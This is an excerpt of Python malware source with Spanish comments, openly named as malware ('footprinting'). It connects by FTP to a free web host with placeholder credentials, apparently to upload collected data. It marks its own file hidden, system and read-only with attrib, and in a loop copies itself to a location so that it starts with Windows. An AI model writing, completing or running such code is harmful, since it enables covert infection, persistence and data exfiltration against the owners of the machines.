...
session = ftplib.FTP('files.000webhost.com','000webhost-username','000000webhost-password')

info_ip = None

malware_name = "footprinting"
...
actual_dir = os.path.dirname(os.path.realpath(__file__)) + malware_name + ".py"
os.system('attrib +R +H +S {a}'.format(a = actual_dir + malware_name + ".py"))

while True:
    # Guardar el malware para iniciar con Windows
    malware = os.popen("if EXIST {a} (echo Estado del malware: OK) else (copy {b} {c})".format(a = save_dir + malware_name + ".py", b = actual_dir, c = save_dir)).read()

    # Esconder
    os.system('attrib +R +H +S {a}'.format(a = save_dir + malware_name + ".py"))
